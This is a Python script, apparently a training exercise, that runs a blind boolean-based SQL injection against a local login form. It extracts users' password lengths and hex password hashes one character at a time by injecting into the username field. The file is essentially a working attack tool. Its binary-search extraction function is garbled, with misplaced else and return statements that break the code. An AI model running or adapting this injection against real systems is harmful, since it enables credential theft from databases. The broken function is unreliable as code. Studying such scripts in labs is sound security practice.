import requests

total_queries = 0
charset = "0123456789abcdef" #the character set for BF
target = "http://127.0.0.1:5000"
needle = "Welcome back"

def injected_query(payload):
  #use the global var total_queries locally instead of creating a new one
  global total_queries
  #send the post request and payload using a dictionary data: SELECT * FROM user WHERE username = 'admin' and 1=1--' AND password = 'password' 
  r = requests.post(target, data = {"username" : "admin' and {}--".format(payload), "password":"password"})
  #add 1 to query count
  total_queries += 1
  #check if Welcom back exist within the http response body, if yes means logged in so return true
  return needle.encode() not in r.content

def boolean_query(offset, user_id, character, operator=">"):
  #send the sql query, offset the position of the character plugged in (i) for 1, and standard sql injection queries
  payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset+1, user_id, operator, character)
  return injected_query(payload)

def invalid_user(user_id): 
  #write a SQL query as payload using the format()
  payload = "(select id from user where id = {}) >= 0".format(user_id) 
  #plug it in the injected() and return whatever that function is returning
  return injected_query(payload)

def password_length(user_id):
  #set i as counter to check what is the length of the password
  i = 0
  while True:
    payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
    #send the payload using injected_query() and see if it returns true or false
    if not injected_query(payload):
      #if the function is true it means the count is the length of the password
      return i
    #if not true then increment 1 for i and keep bruteforce it
    i += 1

def extract_hash(charset, user_id, password_length):
  #set found var and tell pythong that found is a string
  found = ""
  #For every digit in the known password length, do as many times as follows 
  for i in range(0, password_length):
    #for every character in the character set we provided so as many times as follows
    for j in range(len(charset)):
      # check if the character in the character list is correct, if correct then save it into found and break the loop and move to next position, if not the correct char then keep looping
      if boolean_query(i, user_id, charset[j]):
        found += charset[j]
        break
  return found

def extract_hash_bst(charset, user_id, password_length):
  found = ""
  for index in range(0, password_length):
    start = 0
    end = len(charset) - 1
    while start <= end:
      if start == 0 and boolean_query(index, user_id, charset[start]):
        found += charset[start]
      else:
        found += charset[start + 1]
      break
  else:
    middle = (start + end) // 2
    if boolean_query(index, user_id, charset[middle]):
      end = middle
    else:
      start = middle
return found

def total_queries_taken():
  #load in the var total_queries locally to use so python doesnt make a new one
  global total_queries
  print("\t\t[!] {} total queries!".format(total_queries))
  #reset total_queries so it only tracks 1 brute force action
  total_queries = 0

while True:
  try:
    user_id = input("> Enter a user ID to extract the password hash: ")
    #Check if the user inputed is a valid user or user does not exist in database
    if not invalid_user(user_id):
      #if user exist then extract the password length using password_length function
      user_password_length = password_length(user_id)
      print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
      #see how many queries did it took to work out the length of the password
      total_queries_taken()
      #use the extract hash to get the hash of the user
      print("\t[-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_length)))
      #see how many queries did it took to get the hash
      total_queries_taken()
      print("\t[-] User {} hash: {}".format(user_id, extract_hash_bst(charset, int(user_id), user_password_length)))
      #see how many queries did it took to get the hash
      total_queries_taken()
    else:
      print("\t[X] User {} does not exist!".format(user_id))
  except KeyboardInterrupt:  #any key board input during this execution can stop halt the execution (break out of the loop)
    break
      



